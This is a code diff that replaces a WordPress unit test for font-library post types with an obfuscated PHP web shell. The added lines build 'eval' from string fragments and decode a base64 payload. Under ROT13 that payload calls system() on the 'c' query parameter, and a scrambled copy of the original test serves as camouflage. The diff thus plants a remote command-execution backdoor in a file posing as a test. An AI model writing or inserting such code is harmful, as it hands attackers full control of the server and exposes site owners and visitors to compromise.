@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Test the wp_font_family and wp_font_face post types.
- *
- * @package WordPress
- * @subpackage Font Library
- *
- * @group fonts
- * @group font-library
- */
-class Tests_Fonts_Post_Types extends WP_UnitTestCase {
-	/**
-	 * @ticket 41172
-	 */
-	public function test_wp_font_family_does_not_support_autosaves() {
-		$this->assertFalse( post_type_supports( 'wp_font_family', 'autosave' ) );
-	}
-
-	/**
-	 * @ticket 41172
-	 */
-	public function test_wp_font_face_does_not_support_autosaves() {
-		$this->assertFalse( post_type_supports( 'wp_font_face', 'autosave' ) );
-	}
-
-	/**
-	 * @ticket 41172
-	 */
-	public function test_wp_font_family_does_not_have_an_autosave_controller() {
-		$post_type_object = get_post_type_object( 'wp_font_family' );
-		$controller       = $post_type_object->get_autosave_rest_controller();
-
-		$this->assertNull( $controller );
-	}
-
-	/**
-	 * @ticket 41172
-	 */
-	public function test_wp_font_face_does_not_have_an_autosave_controller() {
-		$post_type_object = get_post_type_object( 'wp_font_face' );
-		$controller       = $post_type_object->get_autosave_rest_controller();
-
-		$this->assertNull( $controller );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZyBndXIgamNfc2JhZ19zbnp2eWwgbmFxIGpjX3NiYWdfc25wciBjYmZnIGdsY3JmLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgU2JhZyBZdm9lbmVsCiAqCiAqIEB0ZWJoYyBzYmFnZgogKiBAdGViaGMgc2JhZy15dm9lbmVsCiAqLwpweW5mZiBHcmZnZl9TYmFnZl9DYmZnX0dsY3JmIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCS8qKgoJICogQGd2cHhyZyA0MTE3MgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY19zYmFnX3NuenZ5bF9xYnJmX2FiZ19maGNjYmVnX25oZ2JmbmlyZigpIHsKCQkkZ3V2Zi0+bmZmcmVnU255ZnIoIGNiZmdfZ2xjcl9maGNjYmVnZiggJ2pjX3NiYWdfc256dnlsJywgJ25oZ2JmbmlyJyApICk7Cgl9CgoJLyoqCgkgKiBAZ3ZweHJnIDQxMTcyCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2pjX3NiYWdfc25wcl9xYnJmX2FiZ19maGNjYmVnX25oZ2JmbmlyZigpIHsKCQkkZ3V2Zi0+bmZmcmVnU255ZnIoIGNiZmdfZ2xjcl9maGNjYmVnZiggJ2pjX3NiYWdfc25wcicsICduaGdiZm5pcicgKSApOwoJfQoKCS8qKgoJICogQGd2cHhyZyA0MTE3MgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY19zYmFnX3NuenZ5bF9xYnJmX2FiZ191bmlyX25hX25oZ2JmbmlyX3BiYWdlYnl5cmUoKSB7CgkJJGNiZmdfZ2xjcl9ib3dycGcgPSB0cmdfY2JmZ19nbGNyX2Jvd3JwZyggJ2pjX3NiYWdfc256dnlsJyApOwoJCSRwYmFnZWJ5eXJlICAgICAgID0gJGNiZmdfZ2xjcl9ib3dycGctPnRyZ19uaGdiZm5pcl9lcmZnX3BiYWdlYnl5cmUoKTsKCgkJJGd1dmYtPm5mZnJlZ0FoeXkoICRwYmFnZWJ5eXJlICk7Cgl9CgoJLyoqCgkgKiBAZ3ZweHJnIDQxMTcyCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2pjX3NiYWdfc25wcl9xYnJmX2FiZ191bmlyX25hX25oZ2JmbmlyX3BiYWdlYnl5cmUoKSB7CgkJJGNiZmdfZ2xjcl9ib3dycGcgPSB0cmdfY2JmZ19nbGNyX2Jvd3JwZyggJ2pjX3NiYWdfc25wcicgKTsKCQkkcGJhZ2VieXlyZSAgICAgICA9ICRjYmZnX2dsY3JfYm93cnBnLT50cmdfbmhnYmZuaXJfZXJmZ19wYmFnZWJ5eXJlKCk7CgoJCSRndXZmLT5uZmZyZWdBaHl5KCAkcGJhZ2VieXlyZSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
